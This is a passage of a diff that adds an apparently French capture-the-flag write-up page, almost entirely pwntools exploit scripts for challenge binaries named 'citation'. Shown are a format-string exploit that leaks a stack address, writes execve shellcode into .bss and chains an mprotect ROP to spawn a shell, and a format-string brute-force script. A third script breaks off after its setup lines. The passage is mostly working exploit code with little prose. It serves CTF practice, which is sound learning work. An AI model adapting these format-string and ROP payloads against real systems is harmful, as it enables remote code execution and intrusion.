+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">1448</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer_fmt_offset</span> <span class="o">=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040225d</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004128f9</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_rbx</span> <span class="o">=</span> <span class="mh">0x000000000047ce8b</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x004bc100</span>
+</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="mh">0x000000000042e070</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">b write_quote
+</span></span></span><span class="line"><span class="cl"><span class="s1">continue
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_fmt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_payload</span><span class="p">(</span><span class="n">area</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">www</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">www</span><span class="p">[</span><span class="n">area</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_fmt_offset</span><span class="p">,</span> <span class="n">www</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Leaking return address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Leaking stack address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;crire : &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">debug</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">debug</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="n">rip_offset</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Saved RIP @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">saved_rip</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Writing shellcode on a .bss section&#39;s page, the `120` is added to avoid the badchar `\n` being present in the format string payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload_page</span> <span class="o">=</span> <span class="n">align_ptr</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload_area</span> <span class="o">=</span> <span class="n">payload_page</span> <span class="o">+</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Writing shellcode @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">payload_area</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_payload</span><span class="p">(</span><span class="n">payload_area</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Mprotecting the .bss section&#39;s page and jumping on it</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">www</span> <span class="o">=</span> <span class="p">{</span><span class="n">saved_rip</span> <span class="p">:</span> <span class="n">pop_rdi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span>  <span class="mi">8</span> <span class="p">:</span> <span class="n">payload_page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">16</span> <span class="p">:</span> <span class="n">pop_rsi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">24</span> <span class="p">:</span> <span class="mh">0x1000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">32</span> <span class="p">:</span> <span class="n">pop_rdx_rbx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">40</span> <span class="p">:</span> <span class="mh">0x7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">56</span> <span class="p">:</span> <span class="n">mprotect</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">64</span> <span class="p">:</span> <span class="n">payload_area</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Building Mprotect&#39;s ROP chain and shelling a shell&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_fmt_offset</span><span class="p">,</span> <span class="n">www</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;byte&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span></code></pre></div><ul>
+<li>Première partie intended</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># this exploit was generated via</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1) pwntools</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2) ctfmate</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;citation&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set up pwntools for the correct architecture</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
+</span></span><span class="line"><span class="cl"><span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
+</span></span><span class="line"><span class="cl"><span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
+</span></span><span class="line"><span class="cl"><span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
+</span></span><span class="line"><span class="cl"><span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
+</span></span><span class="line"><span class="cl"><span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">b write_quote
+</span></span></span><span class="line"><span class="cl"><span class="s1">continue
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_fmt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_citation</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1: Lire une citation&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">chosen_index</span> <span class="o">=</span> <span class="mh">0x004be130</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fmtstr_buffer_offset</span> <span class="o">=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">num_quote_val</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">80400</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chosen_index_val</span> <span class="o">=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="n">num_quote_val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="n">chosen_index_val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">fmtstr_buffer_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">chosen_index</span> <span class="p">:</span> <span class="n">val</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">citation</span> <span class="o">=</span> <span class="n">read_citation</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;404&#34;</span> <span class="ow">in</span> <span class="n">citation</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">citation</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="n">citation</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span></code></pre></div><ul>
+<li>Seconde partie</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># this exploit was generated via</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1) pwntools</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2) ctfmate</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;une_citation_pas_comme_les_autres_2_2&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/home/kali/Desktop/404_Heap/second_stage/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/home/kali/Desktop/404_Heap/second_stage/ld-2.27.so&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set up pwntools for the correct architecture</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
